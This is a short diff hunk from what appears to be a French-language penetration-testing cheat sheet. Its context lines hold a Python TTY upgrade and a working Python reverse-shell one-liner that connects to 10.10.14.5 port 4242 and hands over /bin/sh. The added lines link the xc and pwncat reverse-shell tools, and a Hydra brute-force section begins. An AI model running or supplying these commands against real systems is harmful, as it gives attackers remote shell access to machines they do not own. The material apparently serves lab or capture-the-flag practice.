@@ -90,6 +90,9 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 export RHOST="10.10.14.5";export RPORT=4242;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
+Autre NetCat : https://github.com/xct/xc
+............ : https://github.com/calebstewart/pwncat
+
 
 # BRUTE FORCE
 Avec Hydra :
